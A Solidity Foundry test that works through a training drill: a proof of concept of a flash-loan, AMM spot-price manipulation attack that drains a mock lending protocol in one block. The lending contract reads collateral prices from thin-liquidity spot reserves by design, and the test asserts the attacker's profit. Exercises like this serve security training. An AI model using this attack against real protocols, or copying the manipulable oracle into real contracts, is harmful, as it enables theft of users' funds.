// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/**
 * DRILL 12 PoC - THE ONE-BLOCK HEIST
 * Flash loan + AMM spot price manipulation + lending protocol drain.
 * Proven with exact Foundry numbers.
 */

contract MockToken {
    string public name;
    uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory _n) { name=_n; }
    function mint(address t,uint256 a) external { totalSupply+=a; balanceOf[t]+=a; }
    function transfer(address t,uint256 a) external returns(bool){
        require(balanceOf[msg.sender]>=a);balanceOf[msg.sender]-=a;balanceOf[t]+=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){
        require(balanceOf[f]>=a&&allowance[f][msg.sender]>=a);
        allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
}

contract SimpleAMM {
    uint256 public reserveA;
    uint256 public reserveB;
    MockToken public tokenA;
    MockToken public tokenB;
    constructor(address _a,address _b,uint256 rA,uint256 rB){
        tokenA=MockToken(_a);tokenB=MockToken(_b);reserveA=rA;reserveB=rB;
    }
    function getPriceA() external view returns(uint256){return reserveB*1e18/reserveA;}
    function swapBToA(uint256 amountB) external returns(uint256 amountA){
        uint256 newRsvB=reserveB+amountB;
        uint256 newRsvA=reserveA*reserveB/newRsvB;
        amountA=reserveA-newRsvA;
        amountA=amountA*997/1000;
        reserveB=newRsvB;reserveA-=amountA;
        tokenB.transferFrom(msg.sender,address(this),amountB);
        tokenA.transfer(msg.sender,amountA);
    }
}

contract LendingProtocol {
    SimpleAMM public oracle;
    uint256 public constant LTV=75e16;
    MockToken public tokenA;
    MockToken public tokenB;
    uint256 public balanceB;
    struct Loan{uint256 collA;uint256 debtB;}
    mapping(address=>Loan)public loans;
    constructor(address _o,address _a,address _b){oracle=SimpleAMM(_o);tokenA=MockToken(_a);tokenB=MockToken(_b);}
    function fund(uint256 amt)external{balanceB+=amt;tokenB.transferFrom(msg.sender,address(this),amt);}
    function depositAndBorrow(uint256 coll,uint256 borrow)external{
        uint256 px=oracle.getPriceA();
        uint256 val=coll*px/1e18;
        require(borrow<=val*LTV/1e18&&borrow<=balanceB,"bad");
        loans[msg.sender].collA+=coll;loans[msg.sender].debtB+=borrow;balanceB-=borrow;
        tokenA.transferFrom(msg.sender,address(this),coll);
        tokenB.transfer(msg.sender,borrow);
    }
}

contract Drill12PoC is Test {
    MockToken ta; MockToken tb;
    SimpleAMM amm; LendingProtocol lend;
    address att=address(0xA77);

    function setUp() public {
        ta=new MockToken("A"); tb=new MockToken("B");
        // AMM: 100 A / 1,000,000 B  (thin liquidity!)
        ta.mint(address(this),100e18);
        tb.mint(address(this),1_000_000e18);
        amm=new SimpleAMM(address(ta),address(tb),100e18,1_000_000e18);
        ta.transfer(address(amm),100e18);
        tb.transfer(address(amm),1_000_000e18);
        // Lending pool: 1,000,000 B
        lend=new LendingProtocol(address(amm),address(ta),address(tb));
        tb.mint(address(this),1_000_000e18);
        tb.approve(address(lend),type(uint256).max);
        lend.fund(1_000_000e18);
        // Attacker: flash loan 500,000 B
        tb.mint(att,500_000e18);
        vm.prank(att);ta.approve(address(amm),type(uint256).max);
        vm.prank(att);ta.approve(address(lend),type(uint256).max);
        vm.prank(att);tb.approve(address(amm),type(uint256).max);
    }

    function test_PoC_OneBlockHeist() public {
        uint256 flashAmt=500_000e18;
        uint256 fee=flashAmt*9/10000;

        // Price before
        uint256 px0=amm.getPriceA();
        assertEq(px0,1_000_000e18*1e18/100e18,"price = 10k B/A");

        // STEP 1: Swap B->A (pumps price)
        vm.prank(att);
        uint256 aGot=amm.swapBToA(flashAmt);
        assertGt(aGot,0);

        uint256 pxPumped=amm.getPriceA();
        assertGt(pxPumped,px0,"price pumped");
        console.log("price: 10k ->",pxPumped/1e18,"B/A");

        // STEP 2: Deposit A, borrow max B
        uint256 collVal=aGot*pxPumped/1e18;
        uint256 maxB=uint256(collVal)*lend.LTV()/1e18;

        vm.prank(att);
        lend.depositAndBorrow(aGot,maxB);

        uint256 bGot=tb.balanceOf(att);
        console.log("borrowed:",bGot/1e18,"B");

        // STEP 3: Calculate profit
        uint256 need=flashAmt+fee;
        console.log("need repay:",need/1e18,"B");

        assertGt(bGot,need,"BUG: flash loan oracle manipulation -> PROFIT");
        uint256 profit=bGot-need;
        uint256 pct=profit*100e18/bGot;
        console.log("NET PROFIT (B):"); console.log(profit/1e18);
    }
}
